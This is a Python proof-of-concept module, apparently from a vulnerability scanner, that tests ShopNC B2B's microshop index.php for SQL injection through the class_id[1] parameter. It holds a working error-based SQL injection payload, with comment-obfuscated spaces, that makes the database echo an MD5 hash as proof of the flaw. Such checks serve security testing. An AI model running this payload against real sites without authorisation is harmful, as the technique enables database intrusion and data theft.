#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: shopNC B2B版 index.php SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0124172
author: Ascotbe
reference: Lucifer
description: 文件index.php中,参数class_id[1]存在SQL注入。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/microshop/index.php?act=personal&class_id[0]=exp&class_id[1]=1)And(Select/**/1/**/From(Select/**/Count(*),Concat((Select(Select(Select/**/Concat(0x7e,Md5(1234),0x7e)))From/**/information_schema.tables/**/limit/**/0,1),Floor(Rand(0)*2))x/**/From/**/Information_schema.tables/**/group/**/by/**/x)a)%23"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
            Medusa = "{} 存在shopNC B2B版 index.php SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass